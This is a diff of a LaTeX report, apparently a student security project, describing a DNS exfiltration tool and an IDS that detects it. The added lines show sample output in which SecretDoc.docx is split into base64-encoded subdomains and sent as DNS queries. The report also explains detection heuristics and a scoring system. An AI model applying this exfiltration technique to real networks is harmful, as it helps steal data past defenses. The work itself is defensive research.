@@ -38,7 +38,7 @@ They are compact, easier to understand and has well documented libraries. If the
     \item https://www.codeproject.com/Tips/465850/Scanning-a-PCAP-dump-to-find-DNS-and-NETBIOS-queri
 \end{enumerate}
 
-
+%make sure nessesary licesnses are included
 
 \section{Threat Tool Usage}
 %talk how it can send a hardcoded message that the user could change with nano, but its really meant for files - hardcoded ip too.
@@ -66,9 +66,35 @@ TRANSMISSION MAY HALT FOR A SECOND OR SO OCCASIONALLY, BE PATIENT!
 
 FILE TUNNEL MODE ENABLED - THE FILE WILL BE TRANSMITTED VIA DNS REQUESTS
 
+Domain to tag: spnutn.com
+DNS Server: 192.168.1.1:53
+File Fragmented: SecretDoc.docx
+Provided: b'PK\x03\x04\n'     Encoded URL: YidQS1x4MDNceDA0XG4n.spnutn.com
+Sent DNS exfiltrated portion!
+
+Domain to tag: htzsfdcx.com
+DNS Server: 192.168.1.1:53
+File Fragmented: SecretDoc.docx
+Provided: b'\textbackslash{}x00\textbackslash{}x00\textbackslash{}x00\textbackslash{}x00\textbackslash{}x00\textbackslash{}textbackslash{}x87N\textbackslash{}textbackslash{}xe2@\textbackslash{}textbackslash{}x00'     Encoded URL: YidceDAwXHgwMFx4MDBceDAwXHgwMFx4ODdOXHhlMkBceDAwJw==.htzsfdcx.com
+Sent DNS exfiltrated portion!
+
+Domain to tag: htmrbek.com
+DNS Server: 192.168.1.1:53
+File Fragmented: SecretDoc.docx
+Provided: b'\textbackslash{}x00\textbackslash{}x00\textbackslash{}x00\textbackslash{}x00\textbackslash{}x00\textbackslash{}x00\textbackslash{}x00\textbackslash{}x00\textbackslash{}x00\textbackslash{}x00'     Encoded URL: YidceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwJw==.htmrbek.com
+Sent DNS exfiltrated portion!
+
+Domain to tag: kyljdnh.com
+DNS Server: 192.168.1.1:53
+File Fragmented: SecretDoc.docx
+Provided: b'\textbackslash{}x00\textbackslash{}t\textbackslash{}x00\textbackslash{}x00\textbackslash{}x00docPr'     Encoded URL: YidceDAwXHRceDAwXHgwMFx4MDBkb2NQcic=.kyljdnh.com
+Sent DNS exfiltrated portion!
+
 ...
 
 \end{tcblisting}
+
+%change because microsoft is getting tagged as sus, its actually not but there is no seperator here
 
 \section{IDS Capture Tool Usage}
 
@@ -178,7 +204,9 @@ Timestamp : Thu Apr 22 04:13:40 2021
 %have wierd unicode build errors
 \end{tcblisting}
 
-%change because microsoft is getting tagged as sus, its actually not but there is no seperator here
+
+
+
 
 \section{Logic Explanation}
 \subsection{Python DNS Exfiltrator}
@@ -231,6 +259,8 @@ A mock lookup system could be developed that checks against a local list of (sub
 Each one of these characteristcs has a false postitive eventuality, no matter how large or small. In combining some of these features into C logic, accuracy can be achived and attacks potentially mitigated. For this reason, a weighting/scoring system has been implemented that can prioritse certain fingerprint charactersistics over others; '==' is more suspicious than the occurance of a few numbers for example.
 
 In addition to detection, the program must be usable and accessible. This means proper argument handling, usage printing, input and output capabilities and feature toggling. Choice over which features included depends on the development process and priority.
+
+%talk liturald datastream vs bytes and why encoding without encryption could show what is attempted to be stolen - find malware that uses this
 
 %show usage and also examples - maybe screencaps
 
